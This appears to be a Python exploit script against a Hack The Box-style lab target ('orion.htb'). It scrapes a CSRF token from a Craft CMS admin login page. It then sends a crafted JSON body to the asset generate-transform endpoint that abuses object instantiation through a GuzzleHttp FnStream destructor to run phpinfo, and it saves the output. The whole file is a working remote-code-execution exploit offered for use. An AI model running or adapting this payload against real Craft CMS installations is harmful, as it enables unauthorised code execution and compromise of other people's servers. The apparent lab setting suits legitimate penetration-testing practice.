import requests, re, sys
from pathlib import Path
from config.paths import get_base_dir

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}

def extract_phpinfo():
    print("[*] Extracting phpinfo via FnStream destructor ...")
    s = requests.Session()
    r = s.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS)
    if r.status_code != 200:
        print(f"[-] Login page: {r.status_code}")
        return None
    csrf_match = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if not csrf_match:
        csrf_match = re.search(r'csrf-token-value[^>]+content="([^"]+)"', r.text, re.I)
    if not csrf_match:
        print("[-] No CSRF token found")
        print(r.text[:2000])
        return None
    tok = csrf_match.group(1)
    print(f"[+] CSRF token: {tok[:40]}...")

    body = {
        "assetId": 11,
        "handle": {
            "width": 123,
            "height": 123,
            "as session": {
                "class": "craft\\behaviors\\FieldLayoutBehavior",
                "__class": "GuzzleHttp\\Psr7\\FnStream",
                "__construct()": [[]],
                "_fn_close": "phpinfo"
            }
        }
    }
    headers = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': tok}
    r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
                json=body, headers=headers, timeout=60)

    print(f"[*] Response: {r2.status_code}, {len(r2.text)} bytes")
    if r2.status_code == 200 and 'PHP Version' in r2.text:
        print("[+] phpinfo captured!")
        return r2.text
    else:
        print(f"[-] No phpinfo. First 1000: {r2.text[:1000]}")
        return None

if __name__ == '__main__':
    output = extract_phpinfo()
    if output:
        path = get_base_dir() / "phpinfo_output.html"
        with open(path, 'w') as f:
            f.write(output)
        print(f"[+] Saved to {path} ({len(output)} bytes)")
    else:
        sys.exit(1)
